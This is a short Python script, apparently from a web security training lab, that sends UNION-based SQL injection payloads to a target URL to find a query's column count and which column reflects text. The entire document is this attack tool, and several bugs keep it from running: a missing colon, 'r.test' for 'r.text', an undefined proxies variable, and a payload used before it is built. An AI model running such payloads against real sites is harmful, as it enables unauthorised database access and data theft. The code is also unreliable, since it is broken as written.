import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning())

def num_columns(url, max_columns=10):
	for i in range(1, max_columns+1)
		payload = "'UNION SELECT " + ",".join(["NULL"] * i) + "--"
		path = "/filter?category=Pets"
		r = requests.get(url + path + payload, proxies=proxies, verify=False)
		res = r.test
		if "Internal Server Error" not in res:
			print("Number of columns is:" + str(i))
			return i
	return False

def text_column(url, col_num):
	for i in range(1, col_num):
		path = "/filter?category=Pets"
		#string should be inside quotes in SQL
		string = "'abcd123'"
		num_of_null = ["NULL"] * col_num
		payload = "'UNION SELECT " + ",".join(payload) + "--"
		r = requests.get(url + path + payload, proxies=proxies, verify=False)
		res = r.test
		#check if string is there in rsponse
		if string.strip("'") in res:
			return i
	return False

def main():
	if len(sys.argv) != 2:
		print("Give target Url")
		print("Example: %s url" % sys.argv[0])
		sys.exit(1)
	url = sys.argv[1]
	col_num = num_columns(url)

if __name__ == '__main__':
	main()